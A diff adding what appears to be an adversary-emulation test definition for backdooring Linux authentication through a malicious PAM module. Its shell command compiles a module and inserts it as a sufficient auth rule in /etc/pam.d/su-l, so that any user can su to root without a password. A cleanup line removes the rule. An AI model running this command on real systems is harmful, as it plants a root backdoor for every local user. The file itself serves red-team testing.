@@ -1,0 +1,25 @@
+---
+- id: 9630f6d2ac825e459abc69a7d692e98b
+  name: Malicious PAM module
+  description: 'Creates a PAM module, inserts a rule to use it, and then tests it.
+
+
+    Upon successful execution, this test will create a PAM module that allows every
+    user to su to root without a password.
+
+    '
+  tactic: multiple
+  technique:
+    attack_id: T1556.003
+    name: 'Modify Authentication Process: Pluggable Authentication Modules'
+  platforms:
+    linux:
+      sh:
+        command: 'if [ -f /tmp/pam_evil.so ]; then : ; else sudo gcc -shared -fPIC
+          -o /tmp/pam_evil.so 8545b9_pam_evil.c; fi; if [ -f /usr/include/security/pam_modules.h
+          ]; then : ; else if [ -n "`which apt-get`" ]; then sudo apt-get -y install
+          libpam0g-dev; elif [ -n "`which yum`" ]; then sudo yum -y install pam-devel;
+          fi; fi;  sudo sed -i "1s,^,auth sufficient /tmp/pam_evil.so\n,g" /etc/pam.d/su-l'
+        payloads:
+        - 8545b9_pam_evil.c
+        cleanup: sudo sed -i "\,auth sufficient /tmp/pam_evil.so,d" /etc/pam.d/su-l
